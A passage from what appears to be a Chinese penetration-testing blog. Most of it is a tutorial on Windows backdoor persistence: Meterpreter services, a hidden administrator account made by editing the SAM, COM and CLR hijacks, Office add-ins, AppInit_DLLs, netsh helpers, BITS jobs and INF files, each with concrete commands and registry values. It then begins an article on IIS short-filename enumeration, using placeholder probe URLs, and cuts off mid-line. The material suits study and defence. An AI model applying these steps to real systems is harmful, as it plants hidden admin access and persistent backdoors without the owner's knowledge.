title="自启动服务"></a>自启动服务</h2><p>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将<code>exe</code>文件注册为服务，也可以将<code>dll</code>文件注册为服务</p><p>为了方便起见我们可以直接用<code>Metasploit</code>来注册一个服务</p><pre><code class="hljs dockerfile">meterpreter &gt; <span class="hljs-keyword">run</span><span class="bash"> metsvc -A</span></code></pre><p><img src="/img/wz/nw/n15.jpeg" srcset="/img/loading.gif" alt="n15"></p><p>运行之后msf会在<code>%TMP%</code>目录下创建一个随机名称的文件夹，然后在该文件夹里面生成三个文件：<code>metsvc.dll</code>、<code>metsvc-server.exe</code>、<code>metsvc.exe</code></p><p><img src="/img/wz/nw/n16.png" srcset="/img/loading.gif" alt="n16"></p><p>同时会新建一个服务，其显示名称为<code>Meterpreter</code>，服务名称为<code>metsvc</code>，启动类型为”自动”，默认绑定在31337端口。</p><p><img src="/img/wz/nw/n17.png" srcset="/img/loading.gif" alt="n17"></p><p><img src="/img/wz/nw/n18.png" srcset="/img/loading.gif" alt="n18"></p><p>如果想删除服务，可以执行</p><pre><code class="hljs dockerfile">meterpreter &gt; <span class="hljs-keyword">run</span><span class="bash"> metsvc -r</span></code></pre><h2 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h2><p>影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式是找不到这个用户的信息的</p><p>在用户名后面加一个<code>$</code>可以创建一个匿名用户，创建完毕后我们再把这个用户添加到administrator组</p><pre><code class="hljs routeros">net<span class="hljs-built_in"> user </span>test$ test /addnet localgroup administrators test$ /add</code></pre><p>可以看到<code>net user</code>是看不到我们创建的用户，但是计算机管理-用户和组中可以看到</p><p><img src="/img/wz/nw/n19.png" srcset="/img/loading.gif" alt="n19"></p><p>所以这时候我们就需要修改一下注册表，其键位置为：<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</code></p><p>注意：<code>SAM</code>键值默认是只能<code>system</code>权限修改的，所以我们要修改一下<code>SAM</code>键的权限，给予<code>administrator</code>完全控制和读取的权限</p><p><img src="/img/wz/nw/n20.png" srcset="/img/loading.gif" alt="n20"></p><p>然后我们将<code>administrator</code>用户对应的项中的F值复制到<code>test$</code>对应xiang中的F值，然后保存</p><p><img src="/img/wz/nw/n21.jpeg" srcset="/img/loading.gif" alt="n21"></p><p>然后我们将<code>test$</code>删除掉</p><pre><code class="hljs routeros">net<span class="hljs-built_in"> user </span>test$ /del</code></pre><p>然后再双击导出的注册表文件，然后我们再看一下</p><p><img src="/img/wz/nw/n22.jpeg" srcset="/img/loading.gif" alt="n22"></p><p><code>net user</code>和计算机管理-用户和组中都查看不到用户了，但是我们可以用<code>net user test$</code>查看用户信息</p><p>这个时候我们再用<code>net user test$ /del</code>是删除不掉这个用户的，只能通过注册表来删除。</p><h2 id="waitfor"><a href="#waitfor" class="headerlink" title="waitfor"></a>waitfor</h2><p>关于<code>waitfor</code>手册中是这么解释的：</p><pre><code class="hljs plain">在系统上发送或等待信号。waitfor可用于跨网络同步计算机。</code></pre><p><code>waitfor</code>的语法</p><pre><code class="hljs fsharp">waitfor [/s &lt;Computer&gt; [/u <span class="hljs-meta">[&lt;Domain&gt;\]&lt;User&gt; [/p [&lt;Password&gt;]</span>]]] /si &lt;SignalName&gt;waitfor [/t &lt;Timeout&gt;] &lt;SignalName&gt;</code></pre><p>参数解释：</p><pre><code class="hljs fsharp">/s &lt;Computer&gt;  指定远程计算机的名称或IP地址，默认为本地计算机/u <span class="hljs-meta">[&lt;Domain&gt;]</span>&lt;user&gt;    使用指定用户帐户的凭据运行脚本。默认是使用当前用户的凭据。/p &lt;Password&gt;  指定/u参数中指定的用户帐户的密码。/si            发送指定激活信号。/t             指定等待信号的秒数。默认为无限期等待。&lt;SignalName&gt;    指定等待或发送的信号，不区分大小写，长度不能超过<span class="hljs-number">225</span>个字符</code></pre><p>关于<code>waitfor</code>更多的信息可以看一下微软提供的手册：链接</p><p>我们来测试一下看看</p><pre><code class="hljs jboss-cli">waitfor test &amp;&amp; calc 表示接收信号成功后执行计算器waitfor <span class="hljs-string">/s</span> 192.168.163.143 <span class="hljs-string">/u</span> qiyou <span class="hljs-string">/p</span> qiyou <span class="hljs-string">/si</span> test</code></pre><p>结果如下<br><img src="/img/wz/nw/n23.gif" srcset="/img/loading.gif" alt="n23"></p><p>但是这样只能执行一次，这对我们后门持久化很不利，所以我们得想办法让它持久化。</p><p>这里就要借用一下三好师傅的<code>powershell</code>脚本：链接，三好师傅的分析：链接</p><p>执行效果如下：</p><p><img src="/img/wz/nw/n24.gif" srcset="/img/loading.gif" alt="n24"></p><p>该方法的优点就是能主动激活，但是缺点也明显就是只能在同一网段才能接收和发送激活信号、服务器重启之后就不行了。</p><h2 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h2><p>CLR的简述（来自百度百科）</p><pre><code class="hljs avrasm"><span class="hljs-keyword">CLR</span>(公共语言运行库,Common Language Runtime)和Java虚拟机一样也是一个运行时环境，是一个可由多种编程语言使用的运行环境。<span class="hljs-keyword">CLR</span>的核心功能包括：内存管理、程序集加载、安全性、异常处理和线程同步，可由面向<span class="hljs-keyword">CLR</span>的所有语言使用。并保证应用和底层操作系统之间必要的分离。<span class="hljs-keyword">CLR</span>是.NET Framework的主要执行引擎。</code></pre><p>需要注意的是<code>CLR</code>能够劫持系统中全部<code>.net</code>程序，而且系统默认会调用<code>.net</code>程序，从而导致我们的后门自动触发，这是我们后门持久化的一个好的思路，下面来实现一下</p><p>修改一下注册表，注册表路径：<code>HKEY_CURRENT_USER\Software\Classes\CLSID\</code>，新建子项<code>{11111111-1111-1111-1111-111111111111}</code>（名字随便，只要不与注册表中存在的名称冲突就行），然后再新建子项<code>InProcServer32</code>，新建一个键<code>ThreadingModel</code>，键值为：<code>Apartment</code>，默认的键值为我们<code>dll</code>的路径</p><p><img src="/img/wz/nw/n25.png" srcset="/img/loading.gif" alt="n25"></p><p>然后在cmd下设置一下：<br><strong>PS：要注册为全局变量，不然只能在当前cmd窗口劫持.net程序</strong></p><pre><code class="hljs angelscript">SETX COR_ENABLE_PROFILING=<span class="hljs-number">1</span> /MSETX COR_PROFILER=&#123;<span class="hljs-number">11111111</span><span class="hljs-number">-1111</span><span class="hljs-number">-1111</span><span class="hljs-number">-1111</span><span class="hljs-number">-111111111111</span>&#125; /M</code></pre><p>然后执行一波，效果如下，可以看到已经成功劫持了<br><img src="/img/wz/nw/n26.gif" srcset="/img/loading.gif" alt="n26"></p><h2 id="Hijack-CAccPropServicesClass-and-MMDeviceEnumerator"><a href="#Hijack-CAccPropServicesClass-and-MMDeviceEnumerator" class="headerlink" title="Hijack CAccPropServicesClass and MMDeviceEnumerator"></a>Hijack CAccPropServicesClass and MMDeviceEnumerator</h2><p>什么是<code>COM</code>（来自<code>WIKI</code>）</p><pre><code class="hljs avrasm">组件对象模型（英语：Component Object Model，缩写<span class="hljs-keyword">COM</span>）是微软的一套软件组件的二进制接口标准。这使得跨编程语言的进程间通信、动态对象创建成为可能。<span class="hljs-keyword">COM</span>是多项微软技术与框架的基础，包括OLE、OLE自动化、ActiveX、<span class="hljs-keyword">COM</span>+、DCOM、Windows shell、DirectX、Windows Runtime。</code></pre><p>这个和<code>CRL</code>劫持<code>.NET</code>程序类似，也是通过修改<code>CLSID</code>下的注册表键值，实现对<code>CAccPropServicesClass</code>和<code>MMDeviceEnumerator</code>的劫持，而系统很多正常程序启动时需要调用这两个实例，所以这个很适合我们的后门持久化。</p><p>经测试貌似64位系统下不行（或许是我姿势的问题），但是32位系统下可以，下面说一下32位系统利用方法：</p><p>在<code>%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\</code>下放入我们的后门<code>dll</code>，重命名为<code>test._dl</code></p><p>PS：如果<code>Installer</code>文件夹不存在，则依次创建<code>Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}</code></p><p><img src="/img/wz/nw/640.png" srcset="/img/loading.gif" alt="640"></p><p>然后就是修改注册表了，在注册表位置为：<code>HKCU\Software\Classes\CLSID\</code>下创建项<code>{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</code>，然后再创建一个子项<code>InprocServer32</code>，默认为我们的<code>dll</code>文件路径：<code>C:\Users\qiyou\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}</code>，再创建一个键<code>ThreadingModel</code>，其键值为：<code>Apartment</code></p><p><img src="/img/wz/nw/n27.jpeg" srcset="/img/loading.gif" alt="n27"></p><p>然后就是测试了，打开<code>iexplore.exe</code>，成功弹框</p><p><img src="/img/wz/nw/n28.gif" srcset="/img/loading.gif" alt="n28"></p><p>PS：<code>{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</code>对应<code>CAccPropServicesClass</code>，<code>{BCDE0395-E52F-467C-8E3D-C4579291692E}</code>对应<code>MMDeviceEnumerator</code></p><h2 id="劫持MruPidlList"><a href="#劫持MruPidlList" class="headerlink" title="劫持MruPidlList"></a>劫持MruPidlList</h2><p>在注册表位置为<code>HKCU\Software\Classes\CLSID\</code>下创建项<code>{42aedc87-2188-41fd-b9a3-0c966feabec1}</code>，再创建一个子项<code>InprocServer32</code>，默认的键值为我们的dll路径，再创建一个键<code>ThreadingModel</code>，其键值：<code>Apartment</code></p><p><img src="/img/wz/nw/n29.png" srcset="/img/loading.gif" alt="n29"></p><p>该注册表对应<code>COM</code>对象<code>MruPidlList</code>，作用于<code>shell32.dll</code>，而<code>shell32.dll</code>是Windows的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能。其中<code>explorer.exe</code>会调用<code>shell32.dll</code>，然后会加载COM对象<code>MruPidlList</code>，从而触发我们的<code>dll</code>文件</p><p><img src="/img/wz/nw/n30.jpeg" srcset="/img/loading.gif" alt="n30"></p><p>当用户重启时或者重新创建一个<code>explorer.exe</code>进程时，就会加载我们的恶意dll文件，从而达到后门持久化的效果。这里我们直接结束一个<code>explorer.exe</code>进程再起一个进程来看一下效果</p><p><img src="/img/wz/nw/n31.gif" srcset="/img/loading.gif" alt="n31"></p><h2 id="office系列"><a href="#office系列" class="headerlink" title="office系列"></a>office系列</h2><h3 id="Word-WLL"><a href="#Word-WLL" class="headerlink" title="Word WLL"></a>Word WLL</h3><p>把dll文件保存在<code>%APPDATA%\Microsoft\Word\Startup</code>，然后把后缀名改为<code>wll</code><br>PS：<code>Startup</code>支持启动多个<code>wll</code></p><p>打开word，成功弹框<br><img src="/img/wz/nw/n32.gif" srcset="/img/loading.gif" alt="n32"></p><h3 id="Excel-XLL"><a href="#Excel-XLL" class="headerlink" title="Excel XLL"></a>Excel XLL</h3><p><code>Excel dll</code>的编写可以参考三好师傅这个项目：链接<br>用三好师傅powershell脚本生成现成的<code>Excel dll</code>：链接</p><p>将生成的DLL文件复制到<code>%appdata%\Microsoft\AddIns</code>目录下，然后再修改一下注册表，<code>office</code>版本对应的注册表位置如下：</p><pre><code class="hljs taggerscript">office2003 — HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\O</span>ffice<span class="hljs-symbol">\1</span>1.0\office2007 — HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\O</span>ffice<span class="hljs-symbol">\1</span>2.0\office2010 — HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\O</span>ffice<span class="hljs-symbol">\1</span>4.0\office2013 — HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\O</span>ffice<span class="hljs-symbol">\1</span>5.0\office2016 — HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\O</span>ffice<span class="hljs-symbol">\1</span>6.0\</code></pre><p>我这里使用的2010的，所以我们要修改的是<code>HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Options</code>，添加一个键<code>OPEN</code>，键值为：<code>/R test.dll</code></p><p><img src="/img/wz/nw/n33.jpeg" srcset="/img/loading.gif" alt="n33"></p><p>然后打开<code>Excel</code>，发现成功弹出计算器</p><p><img src="/img/wz/nw/n34.gif" srcset="/img/loading.gif" alt="n34"></p><h3 id="PowerPoint-VBA-add-ins"><a href="#PowerPoint-VBA-add-ins" class="headerlink" title="PowerPoint VBA add-ins"></a>PowerPoint VBA add-ins</h3><p>用三好师傅powershell脚本生成现成的<code>PowerPoint dll</code>：链接</p><p>将生成的DLL文件复制到<code>%appdata%\Microsoft\AddIns</code>目录下，然后参考前面我给出的<code>office</code>版本对应的注册表位置，在<code>HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint</code>下新建一个子项：<code>AddIns</code>，然后在<code>AddIns</code>下面新建一个子项<code>test</code>，新建一个键为<code>Autoload</code>，类型为<code>DWORD</code>，键值为：<code>1</code>；新建一个键为<code>Path</code>，类型为<code>SZ</code>，键值为我们<code>dll</code>文件的路径</p><p><img src="/img/wz/nw/n35.jpeg" srcset="/img/loading.gif" alt="n35"></p><p>打开<code>PowerPoint</code>成功弹出计算器</p><p><img src="/img/wz/nw/n36.gif" srcset="/img/loading.gif" alt="n36"></p><h2 id="文件关联"><a href="#文件关联" class="headerlink" title="文件关联"></a>文件关联</h2><p>什么是文件关联</p><pre><code class="hljs armasm">文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系。一个文件可以与多个应用程序发生关联。可以利用文件的“打开方式”进行关联选择。举个例子来说，位图文件（<span class="hljs-keyword">BMP文件）在Windows中的默认关联程序是“图片”，如果将其默认关联改为用ACDSee程序来打开，那么ACDSee就成了它的默认关联程序。</span><span class="hljs-keyword">PS：来自百度百科</span></code></pre><p>我们可以用<code>assoc</code>命令显示或修改文件扩展名关联，我们可以看一下<code>.txt</code>文件的关联</p><p><img src="/img/wz/nw/n37.png" srcset="/img/loading.gif" alt="n37"></p><p>我们可以用<code>ftype</code>命令显示或修改用在文件扩展名关联中的文件类型</p><p><img src="/img/wz/nw/n38.png" srcset="/img/loading.gif" alt="n38"></p><p>相关注册表</p><pre><code class="hljs taggerscript">HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\C</span>lasse    //保存了当前用户的类注册和文件扩展名信息HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\C</span>lasse   //保存了系统所有用户用户的类注册和文件扩展名信息HKEY_CLASS_ROOT                      //HKEY_CLASSES_ROOT项提供合并来自上面两个的信息的注册表的视图</code></pre><p>我们以<code>.txt</code>为例，通过文件关联来修改它默认打开的程序。<br>修改<code>\HKEY_CLASS_ROOT\txtfile\shell\open\command</code>的默认值为我们要执行的程序</p><p><img src="/img/wz/nw/n39.png" srcset="/img/loading.gif" alt="n39"></p><p>效果如下：</p><p><img src="/img/wz/nw/n40.gif" srcset="/img/loading.gif" alt="n40"></p><h2 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h2><p><code>User32.dll</code>被加载到进程时，会读取<code>AppInit_DLLs</code>注册表项，如果有值，调用<code>LoadLibrary() api</code>加载用户dll。</p><p>其注册表位置为：<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code>，把<code>AppInit_DLLs</code>的键值设置为我们dll路径，将<code>LoadAppInit_DLLs</code>设置为1</p><p><img src="/img/wz/nw/n41.jpeg" srcset="/img/loading.gif" alt="n41"></p><p>效果如下：</p><p><img src="/img/wz/nw/n42.gif" srcset="/img/loading.gif" alt="n42"></p><h2 id="Netsh-helper"><a href="#Netsh-helper" class="headerlink" title="Netsh helper"></a>Netsh helper</h2><p><code>netsh</code>（全称：<code>Network Shell</code>） 是<code>windows</code>系统本身提供的功能强大的网络配置命令行工具，它可以添加自定的dll从而拓展其功能，我们可以使用<code>netsh add helper yourdll.dll</code>来添加拓展功能，添加了之后，在启动<code>netsh</code>的时候就会加载我们dll文件</p><p>添加自定义<code>helper dll</code><br>关于<code>helper dll</code>的编写可以参考这个项目：链接</p><p>我们可以使用两种方式来添加helper：</p><ol><li><p>通过cmd添加helper</p><pre><code class="hljs dockerfile">netsh <span class="hljs-keyword">add</span><span class="bash"> helper test.dll</span></code></pre><p><img src="/img/wz/nw/n43.png" srcset="/img/loading.gif" alt="n43"></p></li><li><p>通过注册表添加helper<br>其位置为：<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code>，创建一个键，名称随便，键值为我们dll的路径</p></li></ol><p><img src="/img/wz/nw/n44.jpeg" srcset="/img/loading.gif" alt="n44"></p><p>效果如下：<br><img src="/img/wz/nw/n45.gif" srcset="/img/loading.gif" alt="n45"></p><h2 id="利用BITS"><a href="#利用BITS" class="headerlink" title="利用BITS"></a>利用BITS</h2><p><code>BITS</code> (后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。</p><p><code>bitsadmin</code>是一个命令行工具，用于创建下载或上传任务并监视其进度。你可以执行<code>bitsadmin /?</code>或<code>bitsadmin /HELP</code>获取帮助列表。</p><p>常见的<code>bitsadmin</code>命令</p><pre><code class="hljs jboss-cli">bitsadmin <span class="hljs-string">/create</span> [type] DisplayName <span class="hljs-string">//</span>创建一个任务bitsadmin <span class="hljs-string">/cancel</span> &lt;Job&gt; <span class="hljs-string">//</span>删除一个任务bitsadmin <span class="hljs-string">/list</span> <span class="hljs-string">/allusers</span> <span class="hljs-string">/verbose</span> <span class="hljs-string">//</span>列出所有任务bitsadmin <span class="hljs-string">/AddFile</span> &lt;Job&gt; &lt;RemoteURL&gt; &lt;LocalName&gt; <span class="hljs-string">//</span>给任务test添加一个下载文件bitsadmin <span class="hljs-string">/SetNotifyCmdLine</span> &lt;Job&gt; &lt;ProgramName&gt; [ProgramParameters] <span class="hljs-string">//</span>设置在任务完成传输时或任务进入状态时将运行的命令行命令。bitsadmin <span class="hljs-string">/Resume</span> &lt;Job&gt; <span class="hljs-string">//</span>激活传输队列中的新任务或挂起的任务。bitsadmin <span class="hljs-string">/cancel</span> &lt;Job&gt; <span class="hljs-string">//</span>删除某个任务bitsadmin <span class="hljs-string">/reset</span> <span class="hljs-string">/allusers</span> <span class="hljs-string">//</span>删除所有任务bitsadmin <span class="hljs-string">/complete</span> &lt;Job&gt; <span class="hljs-string">//</span>完成某个任务</code></pre><p>下面我们来测试一下：</p><pre><code class="hljs sql">bitsadmin /<span class="hljs-keyword">create</span> <span class="hljs-keyword">test</span>bitsadmin /addfile <span class="hljs-keyword">test</span> c:\windows\system32\calc.exe c:\<span class="hljs-keyword">Users</span>\qiyou\Desktop\calc.exe //为了方便起见我们直接复制本地文件bitsadmin /SetNotifyCmdLine <span class="hljs-keyword">test</span> cmd.exe <span class="hljs-string">"cmd.exe /c calc.exe"</span>bitsadmin /<span class="hljs-keyword">resume</span> <span class="hljs-keyword">test</span></code></pre><p>效果如下：<br><img src="/img/wz/nw/n46.gif" srcset="/img/loading.gif" alt="n46"></p><p>重启电脑之后任务还是存在</p><p><img src="/img/wz/nw/n47.png" srcset="/img/loading.gif" alt="n47"></p><p>重启电脑之后任务会再一次被激活，大概几分钟之后我们的命令会再次执行（由于时间太长了就不录制gif了）</p><p><img src="/img/wz/nw/n48.png" srcset="/img/loading.gif" alt="n48"></p><p>如果我们想让任务完成，可以执行<code>bitsadmin /complete test</code>，<code>calc.exe</code>也会复制到桌面上</p><p><img src="/img/wz/nw/n49.png" srcset="/img/loading.gif" alt="n49"></p><h2 id="利用inf文件实现后门"><a href="#利用inf文件实现后门" class="headerlink" title="利用inf文件实现后门"></a>利用inf文件实现后门</h2><p><code>inf</code>文件</p><pre><code class="hljs gams"><span class="hljs-literal">INF</span>文件或安装信息文件是Microsoft Windows用于安装软件和驱动程序的纯文本文件。<span class="hljs-literal">INF</span>文件最常用于安装硬件组件的设备驱动程序。Windows包含用于创建基于<span class="hljs-literal">INF</span>的安装的IExpress工具。<span class="hljs-literal">INF</span>文件是Windows安装程序API及其后续版本Windows Installer的一部分。PS：来自WIKI<span class="hljs-literal">inf</span>`文件的结构想了解更多可以看一下微软的手册：`https:<span class="hljs-comment">//docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939869(v=technet.10)#information-inf-file-entries</span><span class="hljs-number">1.</span> DefaultInstall节（来自WIKI）<span class="hljs-literal">INF</span>文件的结构与INI文件的结构非常类似; 它包含用于指定要复制的文件，对注册表的更改等的各个部分。所有<span class="hljs-literal">INF</span>文件都包含一个[Version]带有Signature 键值对的部分，用于指定<span class="hljs-literal">INF</span>文件所针对的Windows版本。签名通常是<span class="hljs-symbol">$</span>CHICAGO<span class="hljs-symbol">$</span>（对于Windows <span class="hljs-number">9</span>x）或<span class="hljs-symbol">$</span>WINDOWS NT<span class="hljs-symbol">$</span>（对于Windows NT / <span class="hljs-number">2</span>K / XP）。其余大多数部分是用户定义的，并且包含特定于要安装的组件的信息。<span class="hljs-number">2.</span> DefaultInstall节（来自微软的手册）    RunPreSetupCommands-本节中指定的命令在安装服务配置文件之前运行。    RunPostSetupCommands-本节中指定的命令在安装程序完成服务配置文件后运行。    RunPreUnInstCommands-本节中指定的命令在卸载程序开始之前运行。    RunPostUnInstCommands-本节中指定的命令在卸载程序运行后运行。</code></pre><p>下面举一个<code>calc.inf</code>弹计算器的例子</p><pre><code class="hljs routeros">[Version]<span class="hljs-attribute">Signature</span>=<span class="hljs-string">"<span class="hljs-variable">$CHICAGO</span>$"</span><span class="hljs-attribute">AdvancedINF</span>=2.5,"test"[DefaultInstall]<span class="hljs-attribute">RunPreSetupCommands</span>=Command1[Command1]C:\windows\system32\calc.exe</code></pre><p>命令行下执行：</p><pre><code class="hljs css"><span class="hljs-selector-tag">rundll32</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">advpack</span><span class="hljs-selector-class">.dll</span>,<span class="hljs-selector-tag">LaunchINFSection</span> <span class="hljs-selector-tag">calc</span><span class="hljs-selector-class">.inf</span>,<span class="hljs-selector-tag">DefaultInstall</span></code></pre><p>效果如下：<br><img src="/img/wz/nw/n50.gif" srcset="/img/loading.gif" alt="n50"></p><p>后门实现：<br>在注册表<code>HKEY_CURRENT_USER\Software\Microsoft\</code>处依次新建子项<code>\IEAK\GroupPolicy\PendingGPOs</code>，然后再新建几个键，如下：</p><ol><li>键：<code>Count</code>，类型：<code>REG_DWORD</code>，键值：<code>1</code></li><li>键：<code>Path1</code>，类型：<code>REG_SZ</code>，键值：<code>C:\Users\Administrator\Desktop\test\calc.inf</code> //这个为我们inf文件的路径，这里以上面那个inf文件例子为例</li><li>键：<code>Section1</code>，类型：<code>REG_SZ</code>，键值：<code>DefaultInstall</code></li></ol><p>如下图所示：<br><img src="/img/wz/nw/n51.png" srcset="/img/loading.gif" alt="n51"></p><p>重启电脑之后成功弹出计算器</p><p><img src="/img/wz/nw/n52.gif" srcset="/img/loading.gif" alt="n52"></p><p>但是重启之后<code>PendingGPOs</code>该项就会被清除，需要我们重新修改注册表</p><p><img src="/img/wz/nw/n53.png" srcset="/img/loading.gif" alt="n53"></p><p><code>仅供学习参考，请勿用于非法用途！</code></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://mp.weixin.qq.com/s/uXnPctlOBmciHM4Q-7oquw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uXnPctlOBmciHM4Q-7oquw</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://mp.weixin.qq.com/s/pz6y8299gMUOgtZjZv5puw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/pz6y8299gMUOgtZjZv5puw</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://mp.weixin.qq.com/s/Qs_JS3cvqchMVUhTucqZ9Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Qs_JS3cvqchMVUhTucqZ9Q</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
      <tag>渗透</tag>
      
      <tag>shell</tag>
      
      <tag>Linux</tag>
      
      <tag>后门</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IIS短文件文件夹漏洞</title>
    <link href="/2020/08/18/iis%E7%9F%AD%E6%96%87%E4%BB%B6/"/>
    <url>/2020/08/18/iis%E7%9F%AD%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。</p><p>Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。</p><p>危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。</p><p>在Windows下查看对应的短文件名，可以使用命令 <code>dir /x</code></p><p><img src="/img/wz/iisduan/1.png" srcset="/img/loading.gif" alt="iis"></p><p>如上图，Downloads对应的短文件名为DOWNLO~1。根据此特性，我们能够通过访问短文件名间接访问它对应的文件。</p><p>由于短文件名的长度固定（xxxxxx~xxxx），因此黑客可直接对短文件名进行暴力破解，从而访问对应的文件。</p><p>举个例子，有一个数据库备份文件 backup_<a href="http://www.abc.com_20190101.sql，它对应的短文件名是" target="_blank" rel="noopener">www.abc.com_20190101.sql，它对应的短文件名是</a> backup<del>1.sql 。因此黑客只要暴力破解出 backup</del>1.sql 即可下载该文件，而无需破解完整的文件名。</p><p>短文件名有以下特征：</p><ul><li>只有前六位字符直接显示，后续字符用~1指代。其中数字1还可以递增，如果存在多个文件名类似的文件（名称前6位必须相同，且后缀名前3位必须相同）</li><li>后缀名最长只有3位，多余的被截断</li><li>访问构造的某个存在的短文件名，会返回404</li><li>访问构造的某个不存在的短文件名，会返回400</li></ul><h2 id="漏洞的局限性"><a href="#漏洞的局限性" class="headerlink" title="漏洞的局限性"></a>漏洞的局限性</h2><p>这个漏洞的局限有几点：</p><ul><li>只能猜解前六位，以及扩展名的前3位</li><li>名称较短的文件是没有相应的短文件名的</li><li>需要IIS和.net两个条件都满足</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞的利用，需要使用到通配符。在windows中，可以匹配n个字符，n可以为0.判断某站点是否存在IIS短文件名暴力破解，构造payload，分别访问如下两个URL:</p><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.xxx.com/*~1****/a.aspx</span><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.xxx.com/1234*~1****/a.aspx</span></code></pre><p>不同版本返回信息不同44</p><p><img src="/img/wz/iisduan/4.jpg" srcset="/img/loading.gif" alt="iis4"></p><p>这里使用了4个星号，主要是为了程序自动化猜解，逐个猜解后缀名中的3个字符，实际上，一个星号与4个星号没有任何区别（上面已经提到，*号可以匹配空）。</p><p>如果访问第一个URL，返回404</p><p><img src="/img/wz/iisduan/2.png" srcset="/img/loading.gif" alt="iis2"></p><p>而访问第二个URL，返回400</p><p><img src="/img/wz/iisduan/3.png" srcset="/img/loading.gif" alt="iis3"></p><p>则目标站点存在漏洞。</p><p>判断漏洞存在后，继续猜解目录下是否存在一个a开头的文件或文件夹，访问：</p><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.xxx.com/a*~1****/a.aspx</span></code></pre><p>如果存在，将返回404。</p><p>如此反复，不断向下猜解完所有的6个字符。</p><p>猜解完之后，得到的序列应该类似：</p><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.xxx.com/abcdef*~1****/a.aspx</span></code></pre><p>到了这一步，需要考虑两种情况，如果以abcdef开头的是一个文件夹，则</p><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.xxx.com/abcdef*~1/a.aspx</span></code></pre><p>将返回404.</p><p>如果abcdef开头的是一个文件，则自动提交</p><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.xxx.com/abcdef*~1*g**/a.aspx</span></code></pre><p>用a-z的26个字母替换上述g的位置，应该能得到多个404页面。（记住一点，404代表的是存在。）如果下面的地址返回404，</p><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span 